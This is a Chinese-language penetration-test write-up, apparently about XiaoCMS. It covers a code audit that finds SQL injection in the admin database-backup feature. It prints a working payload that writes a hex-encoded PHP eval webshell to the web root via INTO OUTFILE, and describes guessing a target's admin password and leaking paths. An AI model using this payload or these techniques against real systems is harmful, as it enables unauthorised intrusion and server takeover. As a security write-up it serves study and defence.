当POST提交并且参数submit参数不为空的时候，将tables字段的
内容存入缓存，然后跳转URL，参数拼装了一个action和size，但
还是访问的当前URL。
再次访问该URL，只不过参数新增了，抓包如下：
再看一下IndexAction的代码。
如果存在GET参数action，则调用export_database方法，查看该
方法内容。
从缓存中取出数据，根据前面的内容可以发现，缓存里面存储的是
表名，这里将缓存取出并赋值给$c_data，再将表名取出赋值给$ta
bles，之后拼接SQL语句，$tabledump，并且还直接代入query方
法执行表结构语句，但是这里对表名未做任何过滤，也就是说如果$
this->db-
>query未做过滤，这里就存在SQL注入，追踪query方法。
没有进行数据过滤，只是替换了下字符串，并且不是针对安全方面
，接着追_db->query()。
同样没有安全过滤，继续追踪。
SQL语句直接执行了，也就说后台的数据备份处存在SQL注入。
利用方法：
将一句话木马进行hex进行编码。
select hex("");
在第一次提交表名的时候篡改数据，让其重新拼装SQL语句。
Payload为：
list_form=&table%5B%5D=xiao_model`; select
unhex('3C3F70687020406576616C28245F504F53545B2778275D293B3F3E')
INTO OUTFILE 'D:/phpstudy_pro/WWW/xiaocms_20141229/111.php';
`;&table%5B%5D=xiao_model_field&submit=%E5%BC%80%E5%A7%8B%E5%A4%
87%E4%BB%BD
执行之后，接着访问URL：
http://192.168.27.1/xiaocms_20141229/admin/index.php?c=database&
action=1&size=2048
即可触发SQL注入漏洞，这里直接进行写入WebShell，使用蚁剑连
接。
成功获取WebShell。
没Day只能猜密码
通过本地的代码审计，发现了目标网址的这个CMS存在一个后台SQL
注入并GetShell的漏洞，但是问题来了，到目前为止目标系统并没
有账号密码，虽然已经发现了后台的地址，但是并不知道账号密码
。
正好本地环境已经搭建好了，看下登录这里的源代码，看看是如何
校验登录的，是否存在绕过的可能。
提交就校验验证码，如果验证码不正确直接返回，如果密码尝试错
误过多，会被限制登录，然后取出用户名和密码，用预编译的方式
进行查询的数据库，也就是SQL注入这里也没戏了，万能密码不好使
了，之后就是密码校验，设置Session了，到这里思路又断了，如
何才能进入后台呢？
测试做到这里，场面比较尴尬，知道后台存在可以GetShell的漏洞
，但是却无法进入后台，既然前台的漏洞都试了一遍无法利用，后
台又无法进入，那就只能靠猜密码了。
这中间被卡住很久，都没有取得成果，直接说成功的方法吧。
在页面底部有一个网址和©2016的标志，当时也确实是闲的，尝试使
用该网址+2016这个年份为密码进行登录，没成想居然成功进入后台
了。
柳暗花明又一村啊！
后台GetShell
进入后台之后，可以利用刚刚代码审计的SQL注入漏洞进行GetShel
l了，由于那个漏洞是通过两个URL进行触发的，第一个URL接收POS
T传输的参数存入缓存，第二个URL才是从缓存里取出数据进行数据
库操作，所以不太好使用工具进行操作，而且SQL注入想写入Shell
还需要满足两个条件，第一是知道网站的绝对路径，第二个是需要
有对应的写入文件权限才可以。
这里先尝试找网站的绝对路径，知道绝对路径后可以直接进行尝试
，本以为进入后台后让程序报错是一个比较容易的事情，但是好像
事情并没有那边简单，多处都做了防报错处理。
篡改C参数会提示Controller不存在，篡改A参数会提示Action不
存在，篡改后面的ID呢，则没有任何效果，经过前面的代码分析，
所有的ID都进行了强制类型转换，给转为了整数型，只会返回该ID
所属的栏目不存在。
前后台的URL进行了一通尝试之后都没有什么结果，然后在后台看见
有编辑器的地方，并且可以上传图片文件。
本来想着既然无法寻找到绝对路径，这里又有上传图片的地方，正
好尝试，是否存在任意文件上传，可以更方便的拿到WebShell，上
传抓包。
篡改数据包，修改为phpinfo尝试一下。
很明显，肯定是失败了，但是柳暗花明又一村对不对？虽然图片上
传失败了，但是绝对路径被爆出来了。
绝对路径为：
D:\phpstudy_pro\WWW\xiaocms_20141229\adminSystem\controller\uplo
adfile.php
绝对路径已经拿到了，开始GetShell，打开数据备份处。
随机选择两个系统表，点击开始备份，拦截抓包。
使用payload进行数据篡改：
list_form=&table%5B%5D=xiao_model`; select
unhex('3C3F70687020406576616C28245F504F53545B2778275D293B3F3E')
INTO OUTFILE 'D:/phpstudy_pro/WWW/xiaocms_20141229/111.php';
`;&table%5B%5D=xiao_model_field&submit=%E5%BC%80%E5%A7%8B%E5%A4%
87%E4%BB%BD
提交后，根据提示再继续访问URL：
http://192.168.27.1/xiaocms_20141229/adminsystem/index.php?c=dat
abase&action=1&size=2048
如果该目标数据库有文件写入权限，那么现在在根目录下应该已经
存在111.php文件了，访问一下试试。
未提示404，即可证明该文件生成成功，使用蚁剑连接。
成功拿到WebShell，本次渗透测试到此结束。
结语
本文主要是通过信息收集发现后台，然后在破解密码无果后，发现
其是基于CMS进行搭建的，通过在互联网上进行检索该CMS的历史漏
洞，根据漏洞进行针对性的测试，无法成功后，下载其源码，尝试
构造Payload，但是后续发现互联网上检索的漏洞居然无法复现，
最后通过检索CVE找到其可能存在漏洞的位置，通过代码审计构造Pa
yload，拿到WebShell。
另外在说明一下，有些CVE详情里面会有详细的漏洞利用方法，甚至
Payload等都会给出，但是有些CVE详情并没有给出漏洞利用方法，
只是告知了漏洞所存在的文件以及漏洞类型，所以需要通过这两个
提示自己去进行代码审计，但是通过CVE详情去寻找漏洞不失为一个
走捷径的好办法。
精选留言
用户设置不下载评论
|---|--|--|
| 0 |  |  |
|---|--|--|
| 0 |  |  |